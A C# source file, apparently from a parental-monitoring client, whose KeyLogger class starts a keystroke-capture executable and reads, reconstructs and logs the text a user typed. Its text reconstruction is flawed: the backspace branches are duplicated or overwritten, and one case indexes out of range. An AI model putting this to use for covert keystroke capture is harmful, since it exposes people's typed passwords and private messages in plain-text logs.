using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;

namespace Client_Kidz_protection
{
    /// <summary>
    /// Class to handle anything key logger related
    /// </summary>
    internal class KeyLogger
    {

        private static KeyLogger instance = null;
        private KeyLogger() { }

        public static KeyLogger Instance { get { if (instance == null) instance = new(); return instance; } }

        /// <summary>
        /// Ensures the Keylogger Program is running. If not then run the process.
        /// </summary>
        internal void EnsureInstanceIsRunning()
        {
            Process[] processes = Process.GetProcessesByName("KeyProvider");
            if (processes.Length == 0)
            {

                Console.WriteLine("Not running");
                string str = "./KeyLogger/KeyProvider.exe";
                Process process = new();
                process.StartInfo.FileName = str;
                System.Threading.Tasks.Task.Run(() => process.Start());
            }
        }

        /// <summary>
        /// process the key strokes by hour.
        /// </summary>
        internal string ProcessData(int Minutes, bool DeleteFile)
        {
            string reformedText = "";
            string FileName = "KeyLogger_" + DateTime.Now.AddMinutes(Minutes).ToString("yyyy_M_d_H_m")+".txt";
            if (File.Exists(FileName))
            {
                string text = File.ReadAllText($"./{FileName}");
                Logging.Log.Debug("DEBUG", $"Found the following text: {text}");
                if (!string.IsNullOrEmpty(text))
                {
                    string[] filter = text.Split(',');
                    var filteredText =filter.Where(x => !string.IsNullOrEmpty(x)).ToList();
                    string[] finalResult = new string[filteredText.Count];
                    for(int i = 0; i< filteredText.Count; i++)
                    {
                        string currentValue = filteredText[i];
                        if (currentValue.Contains("BACK") && finalResult.Any())
                        {
                            finalResult[i - 1] = "";
                        }
                        else if (currentValue.Contains("BACK") && finalResult.Any()) continue;
                        else if (currentValue.Contains("ENTER")) finalResult[i] = " ";
                    
                        finalResult[i] = currentValue;
                    }

                    reformedText = string.Join("", finalResult);
                    Debug.Print(reformedText);
                }

                if (DeleteFile) File.Delete($"./{FileName}");
            }

            Logging.Log.Debug("DEBUG", $"Formatted Text: {reformedText}");
            return reformedText;
        }
    }
}
